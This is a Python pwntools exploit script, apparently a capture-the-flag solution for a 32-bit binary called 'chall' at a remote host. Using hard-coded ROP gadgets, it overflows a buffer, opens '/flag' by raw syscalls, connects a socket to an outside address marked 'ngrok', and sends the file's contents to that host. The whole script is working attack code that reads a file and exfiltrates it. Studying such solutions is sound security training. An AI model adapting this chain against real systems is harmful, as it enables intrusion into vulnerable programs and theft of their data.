#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

BINARY = './chall'
HOST = '35.185.187.162'
PORT = 17005

# 0x08057bd2: mov dword ptr [edx], eax; ret;
# 0x0806ee8b: pop edx; ret;
# 0x080ab5ca: pop eax; ret;
# 0x0806eeb2: pop ecx; pop ebx; ret;
# 0x0806f7c0: int 0x80; ret;

def syscall(eax, ebx=0, ecx=0, edx=0):
    payload  = p32(0x0806ee8b)
    payload += p32(edx)
    payload += p32(0x080ab5ca)
    payload += p32(eax)
    payload += p32(0x0806eeb2)
    payload += p32(ecx)
    payload += p32(ebx)
    payload += p32(0x0806f7c0)
    return payload

def write_where_what(where, what):
    payload  = p32(0x080ab5ca)
    payload += p32(what)
    payload += p32(0x0806ee8b)
    payload += p32(where)
    payload += p32(0x08057bd2)
    return payload

def write_str(where, data):
    payload  = ''
    data_split = [data[i:i+4].ljust(4, '\x00') for i in range(0, len(data), 4)]
    for d in data_split:
        payload += write_where_what(where, u32(d))
        where += 4
    return payload

def exploit(REMOTE):
    if not REMOTE: gdb.attach(r, 'b *0x0806f7c0')
    payload  = 'AAAAAAAAAAAAAAAAAAAA'

    # open flag
    payload += write_str(elf.bss(0x10), '/flag\x00')
    payload += syscall(5, elf.bss(0x10), 0, 0)

    # open socket
    sock_arg  = p32(2)
    sock_arg += p32(1)
    sock_arg += p32(0)
    payload += write_str(elf.bss(0x20), sock_arg)
    payload += syscall(0x66, 1, elf.bss(0x20))

    # connect
    IPHEX = 0x67853813
    IPHEX = 0x030ed4ad # ngrok
    connect_struct  = p32(0x0b290002) # port: 1507, domain: AF_INET
    connect_struct += p32(IPHEX)[::-1]
    payload += write_str(elf.bss(0x30), connect_struct)

    connect_arg  = p32(1) # sockfd
    connect_arg += p32(elf.bss(0x30)) # connect_struct
    connect_arg += p32(0x10) # idk
    payload += write_str(elf.bss(0x100), connect_arg)

    payload += syscall(0x66, 3, elf.bss(0x100))

    # read flag
    payload += syscall(3, 0, elf.bss(0x200), 0x100)

    # write to socket
    payload += syscall(4, 1, elf.bss(0x200), 0x100)

    r.sendafter('\n', payload)
    

if __name__ == '__main__':
    REMOTE = len(sys.argv) > 1
    elf = ELF(BINARY, checksec=False)

    if REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False)
        info(r.pid)

    exploit(REMOTE)
    r.interactive()
